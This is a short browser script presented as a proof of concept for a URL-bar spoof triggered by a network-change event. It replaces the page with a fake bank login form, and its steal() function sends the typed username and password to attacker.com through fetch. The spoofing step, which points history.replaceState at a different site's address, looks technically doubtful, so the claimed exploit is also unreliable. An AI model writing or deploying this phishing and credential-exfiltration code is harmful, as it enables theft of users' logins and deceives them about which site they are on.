<script>
// POC: URL Bar Spoof - Network Change Race Condition
const spoofURL = 'https://real-bank.com';
const fakeContent = 'https://fake-phishing.com';

// Trigger on network change
window.addEventListener('online', startSpoof);

function startSpoof() {
    // Freeze URL bar showing legitimate site
    history.replaceState({}, '', spoofURL);
    
    // Replace page content with phishing site
    document.body.innerHTML = `
        <h1>Login Required</h1>
        <input id="user" placeholder="Username">
        <input id="pass" type="password" placeholder="Password">
        <button onclick="steal()">Login</button>
    `;
}

function steal() {
    const user = document.getElementById('user').value;
    const pass = document.getElementById('pass').value;
    // Send stolen credentials
    fetch('https://attacker.com/log?u=' + user + '&p=' + pass);
}
    </script>
